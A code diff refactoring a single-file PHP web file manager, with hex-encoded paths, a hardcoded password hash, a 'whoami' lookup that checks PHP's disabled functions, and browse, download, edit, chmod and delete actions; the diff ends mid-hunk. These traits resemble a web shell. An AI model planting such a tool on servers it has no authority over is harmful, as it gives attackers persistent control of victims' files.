@@ -7,24 +7,14 @@ const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4
 // Buffer for storing alerts to display later
 $alertMessages = [];
 
-function hexToString(string $hex): string
-{
-    return pack('H*', $hex);
-}
-
-function stringToHex(string $string): string
-{
-    return unpack('H*', $string)[1];
-}
-
 function encryptPath(string $path): string
 {
-    return stringToHex($path);
+    return unpack('H*', $path)[1];
 }
 
 function decryptPath(string $path): string
 {
-    return hexToString($path);
+    return pack('H*', $path);
 }
 
 function authenticate(): bool
@@ -47,78 +37,50 @@ function formatSize(int $size): string
 
 function getPerms(string $file): string
 {
-    $perms = fileperms($file);
-
-    // Simple text-based permissions
+    $p = fileperms($file);
+    $map = [[0x0100, 0x0080, 0x0040, 0x0800, 's'], [0x0020, 0x0010, 0x0008, 0x0400, 's'], [0x0004, 0x0002, 0x0001, 0x0200, 't']];
     $info = '';
 
-    // Owner
-    $info .= (($perms & 0x0100) ? 'r' : '-');
-    $info .= (($perms & 0x0080) ? 'w' : '-');
-    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    foreach ($map as [$r, $w, $x, $s, $c]) {
+        $info .= ($p & $r ? 'r' : '-') . ($p & $w ? 'w' : '-');
+        $info .= $p & $x ? ($p & $s ? $c : 'x') : ($p & $s ? strtoupper($c) : '-');
+    }
 
-    // Group
-    $info .= (($perms & 0x0020) ? 'r' : '-');
-    $info .= (($perms & 0x0010) ? 'w' : '-');
-    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
-
-    // World
-    $info .= (($perms & 0x0004) ? 'r' : '-');
-    $info .= (($perms & 0x0002) ? 'w' : '-');
-    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
-
-    // Check if the file/directory is writable
-    $isWritable = is_writable($file);
-    $isReadable = is_readable($file);
-
-    // Return with color coding
-    $colorClass = $isWritable ? 'text-success' : ($isReadable ? 'text-warning' : 'text-error');
-    return '<span class="' . $colorClass . ' font-mono text-xs">' . $info . '</span>';
+    $color = is_writable($file) ? 'text-success' : (is_readable($file) ? 'text-warning' : 'text-error');
+    return '<span class="' . $color . ' font-mono text-xs">' . $info . '</span>';
 }
 
 function getCurrentUser(): string
 {
-    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
-        $user = posix_getpwuid(posix_geteuid());
-        return $user['name'];
-    } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
-        $user = exec('whoami');
-        return $user;
-    } else {
-        return getenv('USERNAME') ?: getenv('USER');
-    }
+    if (function_exists('posix_geteuid'))
+        return posix_getpwuid(posix_geteuid())['name'] ?? '';
+    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions'))))
+        return exec('whoami') ?: '';
+    return getenv('USERNAME') ?: getenv('USER') ?: '';
 }
 
 function breadcrumbPath(string $path): string
 {
-    $path = rtrim($path, DIRECTORY_SEPARATOR);
-    $isWin = DIRECTORY_SEPARATOR === '\\';
-    $parts = $isWin ? explode('\\', $path) : explode('/', $path);
-    $result = '';
+    $sep = DIRECTORY_SEPARATOR;
+    $parts = explode($sep, rtrim($path, $sep));
+    $chevron = '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>';
+    $class = 'text-primary hover:text-primary-hover transition-colors flex items-center';
 
-    $breadcrumb = '';
-
-    if ($isWin) {
-        if (!empty($parts[0])) {
-            $breadcrumb = $parts[0] . '\\';
-            $result .= '<a href="?cd=' . encryptPath($breadcrumb) . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><span>' . htmlspecialchars($parts[0]) . '</span><svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg></a>';
-        }
-        $pathSoFar = $parts[0] . '\\';
-        for ($i = 1; $i < count($parts); $i++) {
-            if (!empty($parts[$i])) {
-                $pathSoFar .= $parts[$i] . '\\';
-                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < count($parts) - 1 ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
-            }
-        }
+    if ($sep === '\\') {
+        $pathSoFar = $parts[0] . $sep;
+        $result = '<a href="?cd=' . encryptPath($pathSoFar) . '" class="' . $class . '"><span>' . htmlspecialchars($parts[0]) . '</span>' . $chevron . '</a>';
     } else {
-        $result = '<a href="?cd=' . encryptPath('/') . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg><span>root</span>' . (count($parts) > 1 && !empty($parts[1]) ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
+        $homeIcon = '<svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>';
         $pathSoFar = '/';
-        for ($i = 1; $i < count($parts); $i++) {
-            if (!empty($parts[$i])) {
-                $pathSoFar .= $parts[$i] . '/';
-                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < count($parts) - 1 ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
-            }
-        }
+        $hasMore = count($parts) > 1 && !empty($parts[1]);
+        $result = '<a href="?cd=' . encryptPath('/') . '" class="' . $class . '">' . $homeIcon . '<span>root</span>' . ($hasMore ? $chevron : '') . '</a>';
+    }
+
+    for ($i = 1, $count = count($parts); $i < $count; $i++) {
+        if (empty($parts[$i]))
+            continue;
+        $pathSoFar .= $parts[$i] . $sep;
+        $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="' . $class . '"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < $count - 1 ? $chevron : '') . '</a>';
     }
 
     return $result;
@@ -126,196 +88,135 @@ function breadcrumbPath(string $path): string
 
 function renderFileTable(string $dir): string
 {
-    ob_start(); // Start output buffering
+    ob_start();
 
-    $allItems = array_diff(scandir($dir), ['.', '..']);
-
-    // Separate folders and files, then sort them separately
-    $folders = [];
-    $files = [];
-
-    foreach ($allItems as $item) {
-        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
-        if (is_dir($fullPath)) {
-            $folders[] = $item;
-        } else {
-            $files[] = $item;
-        }
-    }
-
-    // Sort each array alphabetically
+    // Sort: folders first, then files
+    $items = array_diff(scandir($dir), ['.', '..']);
+    $folders = $files = [];
+    foreach ($items as $item)
+        is_dir($dir . DIRECTORY_SEPARATOR . $item) ? $folders[] = $item : $files[] = $item;
     sort($folders);
     sort($files);
-
-    // Combine with folders first, then files
     $sortedItems = array_merge($folders, $files);
+
+    // Reusable SVGs
+    $svg = [
+        'search' => '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>',
+        'back' => '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"/></svg>',
+        'folder' => '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg>',
+        'file' => '<svg class="h-5 w-5 text-on-surface-variant group-hover:text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>',
+        'download' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>',
+        'edit' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>',
+        'rename' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"/></svg>',
+        'chmod' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>',
+        'delete' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>',
+        'chevron' => '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>',
+    ];
+
+    // Action button helper
+    $actionBtn = function ($type, $path, $item, $isDir, $size = '4') use ($svg) {
+        $enc = encryptPath($path);
+        $json = htmlspecialchars(json_encode($item));
+        $dir = $isDir ? 'true' : 'false';
+        $class = "p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors";
+        $icon = str_replace('h-4 w-4', "h-{$size} w-{$size}", $svg[$type] ?? '');
+
+        return match ($type) {
+            'download' => "<a href=\"?download=$enc\" class=\"$class\" title=\"Download\">$icon</a>",
+            'edit' => "<a href=\"?action=edit&file=$enc\" class=\"$class\" title=\"Edit\">$icon</a>",
+            'rename' => "<a href=\"#\" onclick=\"showRenameModal($json, '$enc', $dir); return false;\" class=\"$class\" title=\"Rename\">$icon</a>",
+            'chmod' => "<a href=\"#\" onclick=\"showChmodModal($json, '$enc', '" . substr(sprintf('%o', fileperms($path)), -4) . "', $dir); return false;\" class=\"$class\" title=\"Permissions\">$icon</a>",
+            'delete' => "<a href=\"#\" onclick=\"showDeleteModal($json, '$enc', $dir); return false;\" class=\"p-1.5 text-error hover:bg-surface-container-high rounded-lg transition-colors\" title=\"Delete\">$icon</a>",
+            default => ''
+        };
+    };
+
+    $parentEnc = encryptPath(dirname($dir));
+    $thClass = 'border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider';
+    $tdClass = 'border-b border-outline-variant px-4 py-3';
 
     echo '<div class="file-list-container">';
 
     // Search bar
-    echo '<div class="mb-4">';
-    echo '<div class="relative">';
-    echo '<div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">';
-    echo '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>';
-    echo '</div>';
+    echo '<div class="mb-4"><div class="relative">';
+    echo '<div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">' . $svg['search'] . '</div>';
     echo '<input type="text" id="fileSearch" class="w-full pl-10 pr-4 py-2 bg-surface-container border border-outline-variant rounded-lg focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant" placeholder="Search files and folders...">';
-    echo '</div>';
-    echo '</div>';
+    echo '</div></div>';
 
-    // Desktop Table View
+    // Desktop Table
     echo '<div class="hidden md:block w-full overflow-hidden rounded-xl shadow-sm border border-outline-variant">';
-    echo '<table class="w-full border-collapse table-auto" id="desktopFileTable">';
-    echo '<thead><tr class="bg-surface-container text-on-surface">';
-    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider">Name</th>';
-    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-24">Size</th>';
-    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-28">Perms</th>';
-    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-40">Modified</th>';
-    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-32">Actions</th>';
+    echo '<table class="w-full border-collapse table-auto" id="desktopFileTable"><thead><tr class="bg-surface-container text-on-surface">';
+    echo "<th class=\"$thClass\">Name</th><th class=\"$thClass w-24\">Size</th><th class=\"$thClass w-28\">Perms</th><th class=\"$thClass w-40\">Modified</th><th class=\"$thClass w-32\">Actions</th>";
     echo '</tr></thead><tbody>';
-
-    // Parent directory link
-    echo '<tr class="hover:bg-surface-container-high transition-colors">';
-    echo '<td class="border-b border-outline-variant px-4 py-3" colspan="5">';
-    echo '<a href="?cd=' . encryptPath(dirname($dir)) . '" class="flex items-center text-primary hover:text-primary-hover transition-colors font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>';
-    echo 'Parent Directory</a>';
-    echo '</td>';
-    echo '</tr>';
+    echo "<tr class=\"hover:bg-surface-container-high transition-colors\"><td class=\"$tdClass\" colspan=\"5\"><a href=\"?cd=$parentEnc\" class=\"flex items-center text-primary hover:text-primary-hover transition-colors font-medium\">{$svg['back']}Parent Directory</a></td></tr>";
 
     foreach ($sortedItems as $item) {
         $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
         $isDir = is_dir($fullPath);
+        $enc = encryptPath($fullPath);
+        $name = htmlspecialchars($item);
 
         echo '<tr class="hover:bg-surface-container-high transition-colors file-row" data-filename="' . htmlspecialchars(strtolower($item)) . '">';
-        echo '<td class="border-b border-outline-variant px-4 py-3">';
+        echo "<td class=\"$tdClass\">";
 
         if ($isDir) {
-            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="flex items-center text-primary hover:text-primary-hover transition-colors group">';
-            echo '<div class="p-1.5 bg-surface-container-high rounded-lg mr-3 group-hover:bg-surface-container-highest transition-colors">';
-            echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>';
-            echo '</div>';
-            echo '<span class="font-medium truncate max-w-xs">' . htmlspecialchars($item) . '</span>';
-            echo '</a>';
+            echo "<a href=\"?cd=$enc\" class=\"flex items-center text-primary hover:text-primary-hover transition-colors group\">";
+            echo '<div class="p-1.5 bg-surface-container-high rounded-lg mr-3 group-hover:bg-surface-container-highest transition-colors">' . $svg['folder'] . '</div>';
         } else {
-            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="flex items-center text-on-surface hover:text-primary transition-colors group">';
-            echo '<div class="p-1.5 bg-surface-container rounded-lg mr-3 group-hover:bg-surface-container-high transition-colors">';
-            echo '<svg class="h-5 w-5 text-on-surface-variant group-hover:text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
-            echo '</div>';
-            echo '<span class="font-medium truncate max-w-xs">' . htmlspecialchars($item) . '</span>';
-            echo '</a>';
+            echo "<a href=\"?action=view&file=$enc\" class=\"flex items-center text-on-surface hover:text-primary transition-colors group\">";
+            echo '<div class="p-1.5 bg-surface-container rounded-lg mr-3 group-hover:bg-surface-container-high transition-colors">' . $svg['file'] . '</div>';
         }
-
-        echo '</td>';
-        echo '<td class="border-b border-outline-variant px-4 py-3 font-mono text-sm text-on-surface-variant">' . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
-        echo '<td class="border-b border-outline-variant px-4 py-3">' . getPerms($fullPath) . '</td>';
-        echo '<td class="border-b border-outline-variant px-4 py-3 text-sm text-on-surface-variant">' . date("Y-m-d H:i", filemtime($fullPath)) . '</td>';
-        echo '<td class="border-b border-outline-variant px-4 py-3">';
-        echo '<div class="flex items-center gap-1">';
-
-        if (!$isDir) {
-            echo '<a href="?download=' . encryptPath($fullPath) . '" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Download">';
-            echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></a>';
-
-            echo '<a href="?action=edit&file=' . encryptPath($fullPath) . '" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Edit">';
-            echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg></a>';
-        }
-
-        echo '<a href="#" onclick="showRenameModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Rename">';
-        echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg></a>';
-
-        echo '<a href="#" onclick="showChmodModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', \'' . substr(sprintf('%o', fileperms($fullPath)), -4) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Permissions">';
-        echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></a>';
-
-        echo '<a href="#" onclick="showDeleteModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-error hover:bg-surface-container-high rounded-lg transition-colors" title="Delete">';
-        echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg></a>';
-
-        echo '</div>';
-        echo '</td></tr>';
+        echo "<span class=\"font-medium truncate max-w-xs\">$name</span></a></td>";
+        echo "<td class=\"$tdClass font-mono text-sm text-on-surface-variant\">" . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
+        echo "<td class=\"$tdClass\">" . getPerms($fullPath) . '</td>';
+        echo "<td class=\"$tdClass text-sm text-on-surface-variant\">" . date("Y-m-d H:i", filemtime($fullPath)) . '</td>';
+        echo "<td class=\"$tdClass\"><div class=\"flex items-center gap-1\">";
+        if (!$isDir)
+            echo $actionBtn('download', $fullPath, $item, $isDir) . $actionBtn('edit', $fullPath, $item, $isDir);
+        echo $actionBtn('rename', $fullPath, $item, $isDir) . $actionBtn('chmod', $fullPath, $item, $isDir) . $actionBtn('delete', $fullPath, $item, $isDir);
+        echo '</div></td></tr>';
     }
-
     echo '</tbody></table></div>';
 
-    // Mobile Card View
+    // Mobile View
     echo '<div class="md:hidden space-y-3" id="mobileFileList">';
-
-    // Parent directory link (mobile)
-    echo '<a href="?cd=' . encryptPath(dirname($dir)) . '" class="flex items-center p-4 bg-surface rounded-xl shadow-sm border border-outline-variant hover:border-primary hover:shadow-md transition-all">';
-    echo '<div class="p-2 bg-surface-container rounded-lg mr-4">';
-    echo '<svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>';
-    echo '</div>';
-    echo '<span class="font-medium text-on-surface">Parent Directory</span>';
-    echo '</a>';
+    echo "<a href=\"?cd=$parentEnc\" class=\"flex items-center p-4 bg-surface rounded-xl shadow-sm border border-outline-variant hover:border-primary hover:shadow-md transition-all\">";
+    echo '<div class="p-2 bg-surface-container rounded-lg mr-4"><svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"/></svg></div>';
+    echo '<span class="font-medium text-on-surface">Parent Directory</span></a>';
 
     foreach ($sortedItems as $item) {
         $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
         $isDir = is_dir($fullPath);
+        $enc = encryptPath($fullPath);
+        $name = htmlspecialchars($item);
 
         echo '<div class="file-card bg-surface rounded-xl shadow-sm border border-outline-variant overflow-hidden hover:border-primary hover:shadow-md transition-all" data-filename="' . htmlspecialchars(strtolower($item)) . '">';
 
-        // Main content area (clickable)
         if ($isDir) {
-            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="flex items-center p-4 border-b border-outline-variant">';
-            echo '<div class="p-3 bg-surface-container-high rounded-xl mr-4">';
-            echo '<svg class="h-6 w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>';
-            echo '</div>';
-            echo '<div class="flex-1 min-w-0">';
-            echo '<h3 class="font-semibold text-on-surface truncate">' . htmlspecialchars($item) . '</h3>';
-            echo '<p class="text-sm text-on-surface-variant">Directory</p>';
-            echo '</div>';
-            echo '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>';
-            echo '</a>';
+            echo "<a href=\"?cd=$enc\" class=\"flex items-center p-4 border-b border-outline-variant\">";
+            echo '<div class="p-3 bg-surface-container-high rounded-xl mr-4"><svg class="h-6 w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg></div>';
+            echo "<div class=\"flex-1 min-w-0\"><h3 class=\"font-semibold text-on-surface truncate\">$name</h3><p class=\"text-sm text-on-surface-variant\">Directory</p></div>{$svg['chevron']}</a>";
         } else {
-            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="flex items-center p-4 border-b border-outline-variant">';
-            echo '<div class="p-3 bg-surface-container rounded-xl mr-4">';
-            echo '<svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
-            echo '</div>';
-            echo '<div class="flex-1 min-w-0">';
-            echo '<h3 class="font-semibold text-on-surface truncate">' . htmlspecialchars($item) . '</h3>';
-            echo '<p class="text-sm text-on-surface-variant">' . formatSize(filesize($fullPath)) . ' &bull; ' . date("Y-m-d H:i", filemtime($fullPath)) . '</p>';
-            echo '</div>';
-            echo '</a>';
+            echo "<a href=\"?action=view&file=$enc\" class=\"flex items-center p-4 border-b border-outline-variant\">";
+            echo '<div class="p-3 bg-surface-container rounded-xl mr-4"><svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></div>';
+            echo "<div class=\"flex-1 min-w-0\"><h3 class=\"font-semibold text-on-surface truncate\">$name</h3><p class=\"text-sm text-on-surface-variant\">" . formatSize(filesize($fullPath)) . ' &bull; ' . date("Y-m-d H:i", filemtime($fullPath)) . '</p></div></a>';
         }
 
-        // Action buttons
         echo '<div class="flex items-center justify-between px-4 py-3 bg-surface-container">';
-        echo '<div class="text-sm">' . getPerms($fullPath) . '</div>';
-        echo '<div class="flex items-center gap-2">';
-
-        if (!$isDir) {
-            echo '<a href="?download=' . encryptPath($fullPath) . '" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Download">';
-            echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></a>';
-
-            echo '<a href="?action=edit&file=' . encryptPath($fullPath) . '" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Edit">';
-            echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg></a>';
-        }
-
-        echo '<a href="#" onclick="showRenameModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Rename">';
-        echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg></a>';
-
